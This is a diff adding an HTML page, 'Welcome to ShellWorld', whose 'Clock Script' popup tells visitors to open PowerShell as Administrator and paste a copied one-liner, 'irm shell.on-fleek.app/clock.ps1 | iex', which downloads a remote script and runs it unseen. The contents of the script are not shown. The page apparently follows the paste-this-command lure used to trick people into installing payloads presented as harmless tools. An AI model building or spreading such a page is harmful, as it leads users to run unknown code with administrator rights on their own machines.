@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        button {
+            padding: 15px 25px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .popup-content {
+            padding: 20px;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            border: 1px solid #ccc;
+            background-color: white;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .popup button {
+            padding: 10px 15px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        #copyBtn {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Welcome to ShellWorld</h1>
+    <button id="openPopupBtn">Clock Script</button>
+
+    <!-- The overlay (background dimming) -->
+    <div id="overlay" class="overlay"></div>
+
+    <!-- The popup window -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <h2>Clock Script Instructions</h2>
+            <ol>
+                <li>Open PowerShell as Administrator</li>
+                <li>Click the button below to copy the following command:</li>
+                <textarea id="commandText" readonly>irm shell.on-fleek.app/clock.ps1 | iex</textarea>
+                <button id="copyBtn">Copy Command to Clipboard</button>
+                <li>Paste it into the PowerShell terminal</li>
+                <li>Press <b>Enter</b> to run the script</li>
+                <li>If the script works, click <b>Yes</b>, otherwise click <b>No</b></li>
+            </ol>
+            <button onclick="closePopup(true)">Yes</button>
+            <button onclick="closePopup(false)">No</button>
+        </div>
+    </div>
+
+    <script>
+        // Open popup when button is clicked
+        document.getElementById('openPopupBtn').addEventListener('click', function () {
+            document.getElementById('popup').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        });
+
+        // Close the popup
+        function closePopup(isSuccessful) {
+            if (isSuccessful) {
+                alert("Thank you for confirming!");
+            } else {
+                alert("Please try again if there was an issue.");
+            }
+            document.getElementById('popup').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        // Copy command to clipboard when button is clicked
+        document.getElementById('copyBtn').addEventListener('click', function () {
+            const commandText = document.getElementById('commandText');
+            commandText.select();
+            commandText.setSelectionRange(0, 99999); // For mobile devices
+
+            try {
+                // Copy command to clipboard
+                document.execCommand('copy');
+                alert("Command copied to clipboard! 🎉");
+            } catch (err) {
+                alert("❌ Failed to copy the command.");
+            }
+        });
+    </script>
+
+</body>
+</html>
